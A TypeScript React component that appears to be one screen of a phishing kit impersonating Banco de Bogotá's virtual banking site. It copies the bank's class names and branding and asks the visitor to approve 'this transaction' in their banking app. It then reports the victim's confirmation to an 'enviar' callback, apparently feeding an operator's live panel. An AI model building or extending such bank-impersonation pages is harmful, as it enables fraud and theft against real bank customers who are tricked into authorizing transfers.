/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState } from "react";

export default function AutorizarApp({
  enviar,
}: {
  enviar?: (code: any) => void;
}) {
  const [loading, setLoading] = useState(false);

  return (
    <>
      {/* HEADER */}
      <div id="bdb-ml-header-bv" className="bdb-ml-header-bv__container">
        <div className="bdb-ml-header-bv__container__content">
          <div className="bdb-ml-header-bv__container__content__button bdb-ml-header-bv__container__content__button--l">
            <div className="bdb-ml-header-bv__container__content__leftBoton">
              <button className="bdb-at-btn bdb-at-btn--text bdb-at-btn--sm--ico">
                <span className="ico-arrow-back"></span> Atrás
              </button>
            </div>
          </div>

          <div className="bdb-ml-header-bv__container__content__center">
            <label className="bdb-ml-header-bv__container__content__center__title">
              Ingreso a Banca Virtual
            </label>
          </div>

          <div className="bdb-ml-header-bv__container__content__button bdb-ml-header-bv__container__content__button--r">
            <div className="bdb-ml-header-bv__container__content__button__rigthBoton">
              <button className="bdb-at-btn bdb-at-btn--text bdb-at-btn--sm--ico bdb-at-btn--sm--ico-right">
                Abandonar <span className="ico-close"></span>
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* BODY */}
      <div className="sherpa-grid">
        <div className="sherpa-container">
          <div className="col-xs-12 col-sm-10 col-md-10 col-lg-6 col-sm-offset-1 col-md-offset-1 col-lg-offset-3">
            <div className="_7pFqf6HtJm-Go1Dv-hAW5g==" style={{ textAlign: "center", marginTop: "24px" }}>
              <span className="sherpa-typography-heading-6">Autorización Requerida</span>
            </div>

            <div style={{ marginTop: "20px" }}>
              <div className="bdb-ml-bm-token" style={{ textAlign: "center", padding: "32px 24px" }}>
                <div style={{ fontSize: "48px", marginBottom: "16px" }}>📲</div>

                <div className="bdb-ml-bm-token__title" style={{ justifyContent: "center" }}>
                  <div className="bdb-ml-bm-token__title__label" style={{ fontSize: "18px", fontWeight: "bold", color: "#002d72" }}>
                    Confirma en tu dispositivo
                  </div>
                </div>

                <div className="bdb-ml-bm-token__description" style={{ fontSize: "15px", lineHeight: "1.6", color: "#333", marginTop: "16px" }}>
                  Por favor autoriza esta transacción en tu app Banco de Bogotá.
                </div>

                <div className="bdb-ml-bm-token__actions" style={{ marginTop: "32px" }}>
                  <div className="bdb-ml-bm-token__actions__send">
                    <button
                      className="bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg"
                      disabled={loading}
                      onClick={() => {
                        setLoading(true);
                        enviar?.({ isAuthorizedNotification: true, view: "autorizar_app" });
                        setTimeout(() => setLoading(false), 3000);
                      }}
                    >
                      {loading ? "Verificando..." : "Ya autoricé la transacción"}
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
